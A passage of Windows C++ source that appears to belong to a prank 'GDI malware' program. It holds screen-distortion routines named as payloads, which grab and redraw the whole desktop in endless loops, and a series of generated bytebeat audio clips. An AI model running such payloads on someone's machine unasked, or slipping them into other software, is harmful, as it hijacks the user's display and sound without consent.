	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				float fx = (tan(x / 30.f) * 150 + ceil(i * 10)) * fabs(cbrt(y / 45.f) * 200 + (i * 10));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				hslcolor.s = 1.f;
				hslcolor.l += 0.1f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload17_num2(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0) / 4, h = GetSystemMetrics(1) / 4, w1 = w * 4, h1 = h * 4;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w1, h1);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w1, h1, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, -10, -10, w, h, hdcCopy, 0, 0, SRCCOPY);
		BitBlt(hdc, w + 10, 0, w, h - 10, hdcCopy, w, 0, SRCCOPY);
		BitBlt(hdc, w * 2 - 10, 0, w - 10, h, hdcCopy, w * 2, 0, SRCCOPY);
		BitBlt(hdc, w * 3 + 10, -10, w, h, hdcCopy, w * 3, 0, SRCCOPY);
		BitBlt(hdc, 0, h + 10, w, h - 10, hdcCopy, 0, h, SRCCOPY);
		StretchBlt(hdc, w, h, w, h, hdcCopy, 0, 0, w1, h1, SRCCOPY);
		BitBlt(hdc, w * 2 + 10, h + 10, w - 10, h - 10, hdcCopy, w * 2, h, SRCCOPY);
		BitBlt(hdc, w * 3 + 10, h, w - 10, h, hdcCopy, w * 3, h, SRCCOPY);
		StretchBlt(hdc, 0, h * 2, w, h, hdcCopy, 0, 0, w1, h1, SRCCOPY);
		StretchBlt(hdc, w, h * 2, w, h, hdcCopy, w + 10, h * 2 + 10, w - 20, h - 20, SRCCOPY);
		StretchBlt(hdc, w * 2 + 10, h * 2 + 10, w - 20, h - 20, hdcCopy, w * 2, h * 2, w, h, SRCCOPY);
		StretchBlt(hdc, w * 3, h * 2, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		BitBlt(hdc, 10, h * 3, w - 10, h, hdcCopy, 0, h * 3, SRCCOPY);
		BitBlt(hdc, w, h * 3 + 10, w, h, hdcCopy, w, h * 3, SRCCOPY);
		BitBlt(hdc, w * 2, h * 3 + 10, w, h, hdcCopy, w * 2, h * 3, SRCCOPY);
		BitBlt(hdc, w * 3 + 10, h * 3 + 10, w, h, hdcCopy, w * 3, h * 3, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	SelectObject(hdcCopy, bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload18_num1(LPVOID lparam) {//again! NO USING AI!
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0, xxx = 0, power = 75; double angle = 0.f, cix = 0, ciy = 0, size = 450 + ((1 + rand() % 14) * 100), ccciii = size;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; y++) { StretchBlt(hdcCopy, -4 + rand() % 9, y, w, 1, hdcCopy, 0, y, w, 1, SRCCOPY); }
		int x = power * cos(angle * PI / 30), y = power * sin(angle * PI / 30);
		StretchBlt(hdcCopy, x / 2, y / 2, w - x, h - y, hdcCopy, 0, 0, w, h, SRCCOPY);
		BitBlt(hdcCopy, rand() % 25, rand() % 25, w, h, hdcCopy, rand() % 25, rand() % 25, SRCAND);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int xy = log10(x + y) ? (x & y) : (y % (x + 3));
				int fx = (x / 2) ^ (2 - x) >> xy;
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		for (int kun = 0; kun < 2; kun++) {
			int rand_num_x = rand() % w, rand_num_y = rand() % h;
			int top_x = 0 + rand_num_x, top_y = 0 + rand_num_y;
			int bottom_x = 180 + rand_num_x, bottom_y = 180 + rand_num_y;
			HRGN circle = CreateEllipticRgn(top_x, top_y, bottom_x, bottom_y);
			SelectClipRgn(hdcCopy, circle);
			HBRUSH hBrush = CreateSolidBrush(RndRGB);
			SelectObject(hdcCopy, hBrush);
			BitBlt(hdcCopy, rand_num_x, rand_num_y, w, h, hdcCopy, rand_num_x, rand_num_y, PATINVERT);
			DeleteObject(circle); DeleteObject(hBrush);
		}
		if (ccciii > size) {
			size = 450 + ((1 + rand() % 14) * 100);
			cix = rand() % (int)(w + size) - (size / 2);
			ciy = rand() % (int)(h + size) - size / 2;
			ccciii = 0;
		}
		else { ccciii += 150; }
		CircleFunction(hdcCopy, cix - ccciii / 2, ciy - ccciii / 2, ccciii, ccciii);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmpcopy);
		if (angle > 361) { angle = 0; }
		else { angle += 3.1415926 / 2; }
		Sleep(1); i++; xxx += 5;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload19_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 }; bmpi.bmiHeader = { sizeof(bmpi), w, h, 1, 32, BI_RGB };
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	while (true) {
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCAND);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * x + w;
				int fx = (int)((11 ^ i) + fabs((11 - i) * sqrt(x - 15)) + (9 * i) + ((6 * i) * tan(y + 44)));
				rgbquad[index].rgbRed += fx >> i;
				rgbquad[index].rgbGreen += fx ^ i;
				rgbquad[index].rgbBlue -= fx | i;
			}
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCERASE);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmpcopy);
		i++;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
VOID WINAPI bytebeat1() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((int(tan(log(cos(t * ((t >> 5) * 14 & 11) / 99))))) | 0) * (t - random())));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat2() {//by UltraDasher965, but i modified it with random()
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t | t >> 10) * (t & t >> 4 & t >> 8) * ((t * random()) / 66)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat3() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((int(tan(t * (log(t >> 5 | t >> 9) * 36)) * 114) | 0));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat4() {//by UltraDasher965
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t & t + t / 256) - t * (t & t >> 10) & 127) * 2);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat5() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((log10(t * 0.1) + tan(t * 1.001)) * cos(t * 0.101)) * (t >> 9));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat6() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((sin(t >> (t >> 13 & 7 | t >> 8) & (t >> 13 & 7 | t >> 8)) * 91));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat7() {//credits to UltraDasher965, but i modified it
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(t * (0x1145147891 >> (t >> 9 & 30) & 55) + t) * (t >> 8));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat8() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan((t << 6) & ((9 * t * (t % 20)) >> 7)) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat9() {//by UltraDasher965
	int nSamplesPerSec = 44100, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t / (1 + (t >> 14 & t))) * t) >> 17));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat10() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t >> 11 >> (t & t >> 4)) * (t >> 5 >> (t & t >> 14) & 128 ? -1 : 1) + (t >> t / (t & 65536 ? 2 : 3) & 63) + (30000 / ((t & 4095) + 1) & 100));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat11() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t & 50) * (((t >> 3) & 3) + 5) * ((((t * (50 / 33)) >> 10) & 5) + 3)) >> ((t >> 4) & 3));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat12() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t >> 9 & 1 + t >> 10 & 0 ? 0 : 10000 / (1 + (t % 8192)) - t / 18 & 8 ? -1 : 0) ^ t >> 5 & ((t * t / ((t % 5033) + 50) | t >> 2) * (t >> 12) >> 4));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat13() {//credits to N17Pro3426, but i modified it a lot
	int nSamplesPerSec = 44100, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((((t & 114 / (t & t >> 51 ? t & t >> 14 ? 5 : 1 : 4)) + (t / "20240630"[(t >> 13) % 8] & 64) + (int(sqrt(4E3 * (t & 16383))) & 64) + (t * (t & t >> 11) & 45)) | 14 + t)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat14() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t % 11 - (t >> 4 | 51 * t | t % 114) - t >> 5 | (t > 14 & 1919 * (t << 8) | (t >> 3) % 1544) * (t % 17 | t % 2048)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat15() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(int(128 * sin((t / ((t & t >> 12) + 1))) + 128) & 199);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat16() {//by UltraDasher965
	int nSamplesPerSec = 44100, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t >> 2 | ((t & t >> 10 & 235) - (t >> 10))) - 15) * 51);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat17() {//by UltraDasher965
	int nSamplesPerSec = 32000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t >> 9 ^ (t >> 9) - (t >> 11) ^ 1) % 13 * t) & 128);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
